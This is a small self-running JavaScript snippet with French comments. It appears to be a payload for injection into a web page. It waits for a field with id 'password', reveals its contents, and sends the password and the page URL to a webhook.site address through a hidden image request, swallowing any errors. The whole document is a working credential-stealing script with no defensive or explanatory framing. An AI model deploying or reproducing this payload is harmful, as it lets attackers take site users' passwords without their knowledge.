(function() {
  if (window.__vault_jok3r_loaded__) return;
  window.__vault_jok3r_loaded__ = true;

  const webhook = 'https://webhook.site/8da442bc-35ab-4621-b309-0af722556df8';

  function exfiltrate(password) {
    let i = new Image();
    i.src = `${webhook}?password=${encodeURIComponent(password)}&url=${encodeURIComponent(window.location.href)}`;
  }

  function revealAndSteal() {
    try {
      const passwordInput = document.getElementById('password');

      if (!passwordInput) {
        setTimeout(revealAndSteal, 500);
        return;
      }

      // Simule le passage en "visible"
      passwordInput.type = 'text';

      // Ou on pourrait appeler directement la fonction native si l'événement est dispo
      // togglePasswordVisibility({ target: /*...*/ });

      // Exfiltration directe
      exfiltrate(passwordInput.value);
    } catch (e) {}
  }

  // Run immédiat
  revealAndSteal();

})();
